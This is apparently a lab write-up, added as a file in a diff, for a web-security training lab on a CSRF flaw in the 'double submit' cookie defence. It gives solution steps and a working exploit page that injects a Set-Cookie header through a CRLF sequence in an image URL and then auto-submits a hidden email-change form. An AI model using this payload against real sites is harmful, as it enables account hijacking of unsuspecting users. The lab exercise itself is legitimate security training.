@@ -1,0 +1,46 @@
+Lab: CSRF where token is duplicated in cookie
+
+This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.
+
+To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+
+
+
+
+// Solution
+
+1. First Login in the lab using credentials "wiener:peter" then update the email to check
+
+2. Then update the another email and intercept the request  there we can see CSRF token both are same
+   Now send it to repeater so to test we change one CSRF while another is as it is so while sending request
+   we can see we can get 404/ Bad Request.
+
+
+3. Now edit and put the CSRF same for both and send the request we can see that we can get the 
+   200 / Ok Request same origin
+
+// Now as we can see that the server don't check the CSRF token it's just check both the CSRF token should be same so we can replace the actual CSRF token with the word "fake" in the exploit
+
+
+
+// Exploit
+
+<script>
+  history.pushState("", "", "/");
+</script>
+<form
+  action="https://0a9800dd033ca8a780840340006700b8.web-security-academy.net/my-account/change-email"
+  method="post"
+>
+  <input type="hidden" name="email" value="bobby@micrsoft.com" />
+  <input type="hidden" name="csrf" value="fake" />
+  <input type="submit" value="Submit Request" />
+</form>
+<img
+  src="https://0a9800dd033ca8a780840340006700b8.web-security-academy.net/?search=hello%0d%0aSet-Cookie%3A%20csrf%3Dfake%3B%20SameSite%3dNone"
+  onerror="document.forms[0].submit()"
+/>
